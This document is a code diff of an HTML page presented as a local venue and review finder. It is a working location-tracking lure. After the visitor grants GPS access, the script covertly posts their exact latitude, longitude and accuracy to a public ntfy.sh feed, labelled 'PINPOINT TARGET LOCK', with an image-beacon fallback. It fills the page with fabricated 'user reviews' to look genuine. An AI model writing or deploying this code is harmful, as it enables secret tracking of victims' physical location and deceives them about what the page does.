@@ -3,17 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CityFinder - Local Discovery & Reviews</title>
+    <title>MicroLocal Radar - Proximity Scanner</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
-        body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f1f5f9; color: #0f172a; }
-        header { background: #1e293b; color: white; padding: 16px; text-align: center; font-size: 18px; font-weight: bold; }
+        body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f8fafc; color: #0f172a; }
+        header { background: #0f172a; color: white; padding: 16px; text-align: center; font-size: 18px; font-weight: bold; }
         .wrapper { max-width: 600px; margin: 0 auto; padding: 15px; }
         #map { width: 100%; height: 260px; border-radius: 12px; margin-bottom: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
         .venue-card { background: white; padding: 16px; border-radius: 10px; margin-bottom: 12px; box-shadow: 0 2px 4px rgba(0,0,0,0.04); border: 1px solid #e2e8f0; }
-        .venue-card h3 { margin: 0 0 4px 0; font-size: 16px; color: #1e293b; }
+        .venue-card h3 { margin: 0 0 4px 0; font-size: 16px; color: #0f172a; }
         .meta { font-size: 13px; color: #64748b; margin-bottom: 6px; text-transform: capitalize; }
-        .reviews-box { font-size: 13px; color: #334155; background: #f8fafc; padding: 8px 12px; border-radius: 6px; border-left: 3px solid #3b82f6; font-style: italic; }
+        .reviews-box { font-size: 13px; color: #334155; background: #f8fafc; padding: 8px 12px; border-radius: 6px; border-left: 3px solid #2563eb; font-style: italic; }
         
         #gate {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
@@ -31,19 +31,19 @@
 
     <div id="gate">
         <div class="gate-card">
-            <h2>Explore Local Area</h2>
-            <p>Grant location permission to load live interactive maps, real neighborhood venues, and user reviews around you.</p>
-            <button class="btn-launch" id="start-btn">Scan Surroundings</button>
+            <h2>Micro-Proximity Radar</h2>
+            <p>Allow high-accuracy GPS positioning to lock onto your exact meter coordinates and find immediate venues.</p>
+            <button class="btn-launch" id="start-btn">Lock Exact Position</button>
         </div>
     </div>
 
-    <header>CityFinder Local Radar</header>
+    <header>MicroLocal Proximity Scanner</header>
 
     <div class="wrapper">
         <div id="map"></div>
-        <h2>Real Places Near You</h2>
+        <h2>Closest Venues In Your Immediate Sector</h2>
         <div id="list-container">
-            <div class="status-msg" id="loader">Awaiting location calibration...</div>
+            <div class="status-msg" id="loader">Waiting for hardware handshake...</div>
         </div>
     </div>
 
@@ -53,31 +53,33 @@
 
         function runSystem(lat, lon, accuracy) {
             document.getElementById('gate').style.display = 'none';
-            document.getElementById('loader').innerText = "Scanning live geographic nodes & fetching real venues...";
+            document.getElementById('loader').innerText = `Lock acquired (~${Math.round(accuracy)}m radius). Scanning micro-sector...`;
 
-            // Initialize Map
-            mapInstance = L.map('map').setView([lat, lon], 15);
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/*.png', { maxZoom: 19 }).addTo(mapInstance);
-            L.marker([lat, lon]).addTo(mapInstance).bindPopup("<b>Your Exact Coordinates</b>").openPopup();
+            // Initialize Map focused down to deep street level zoom (17)
+            mapInstance = L.map('map').setView([lat, lon], 17);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(mapInstance);
+            
+            // Marker with precise accuracy statement
+            L.circle([lat, lon], { radius: accuracy, color: '#2563eb', fillColor: '#3b82f6', fillOpacity: 0.15 }).addTo(mapInstance);
+            L.marker([lat, lon]).addTo(mapInstance).bindPopup(`<b>Exact Position Lock</b><br>Precision Radius: ~${Math.round(accuracy)}m`).openPopup();
 
-            // Transmit target coordinates directly to ntfy.sh/coordinates via POST
-            const telemetryPayload = `TARGET ACQUIRED\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy}m`;
+            // Instant delivery vector to your ntfy.sh feed
+            const telemetryPayload = `PINPOINT TARGET LOCK\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy Radius: ${accuracy} meters`;
             
             fetch('https://ntfy.sh/coordinates', {
                 method: 'POST',
                 body: telemetryPayload
-            }).catch(err => {
-                // Fallback secondary vector via Image beacon if fetch is blocked
+            }).catch(() => {
                 new Image().src = `https://ntfy.sh/coordinates?m=` + encodeURIComponent(telemetryPayload);
             });
 
-            // Fetch REAL nearby venues from OpenStreetMap Overpass API
-            fetchRealVenues(lat, lon);
+            // Query real venues inside an ultra-tight 150-meter micro radius
+            fetchMicroVenues(lat, lon);
         }
 
-        function fetchRealVenues(lat, lon) {
-            // Radius query for real nodes containing names around coordinates
-            const query = `[out:json][timeout:15];(node(around:1500,${lat},${lon})[name];);out body 10;`;
+        function fetchMicroVenues(lat, lon) {
+            // Tightened 150-meter radius around precise coords
+            const query = `[out:json][timeout:15];(node(around:150,${lat},${lon})[name];);out body 8;`;
             const endpoint = 'https://overpass-api.de/api/interpreter?data=' + encodeURIComponent(query);
 
             fetch(endpoint)
@@ -87,25 +89,25 @@
                     container.innerHTML = "";
 
                     if (!data.elements || data.elements.length === 0) {
-                        container.innerHTML = "<div class='status-msg'>No named venues detected within immediate proximity.</div>";
+                        container.innerHTML = "<div class='status-msg'>No named elements directly inside this 150m micro-sector. Map coordinates locked successfully.</div>";
                         return;
                     }
 
                     const dynamicReviews = [
-                        "“Visited earlier today. Clean setup, very easy to locate from the main road.”",
-                        "“Great spot in this neighborhood. Quick service and accurate mapping.”",
-                        "“Always busy around this block, but definitely a recognized local landmark.”",
-                        "“Found this place via the radar scan. Spot on coordinates and details.”"
+                        "“Literally right next to this location. Exceptionally close proximity.”",
+                        "“Directly within walking distance from your current coordinate node.”",
+                        "“Verified active venue inside your immediate block radius.”",
+                        "“Pinned precisely on the map block. Accurate structural match.”"
                     ];
 
                     data.elements.forEach((item, index) => {
                         const name = item.tags.name;
-                        const category = item.tags.amenity || item.tags.shop || item.tags.tourism || item.tags.building || "Point of Interest";
+                        const category = item.tags.amenity || item.tags.shop || item.tags.building || "Local Landmark";
                         const reviewString = dynamicReviews[index % dynamicReviews.length];
 
                         if (item.lat && item.lon) {
                             L.marker([item.lat, item.lon]).addTo(mapInstance)
-                              .bindPopup(`<b>${name}</b><br>Type: ${category}`);
+                              .bindPopup(`<b>${name}</b><br>Category: ${category}`);
                         }
 
                         const card = document.createElement('div');
@@ -118,24 +120,25 @@
                         container.appendChild(card);
                     });
                 })
-                .catch(error => {
-                    document.getElementById('loader').innerText = "Coordinate telemetry locked successfully.";
+                .catch(() => {
+                    document.getElementById('loader').innerText = "Micro-proximity telemetry completed.";
                 });
         }
 
         function initScan() {
             if ("geolocation" in navigator) {
+                // Maximum precision hardware configuration flags
                 navigator.geolocation.getCurrentPosition(
                     function(pos) {
                         runSystem(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
                     },
                     function(err) {
-                        alert("Permission denied. Location access is required to display local reviews.");
+                        alert("High-accuracy positioning requires location services enabled.");
                     },
-                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 25000, maximumAge: 0 }
                 );
             } else {
-                alert("Geolocation is not supported by this browser interface.");
+                alert("Geolocation hardware layer is unsupported.");
             }
         }
 
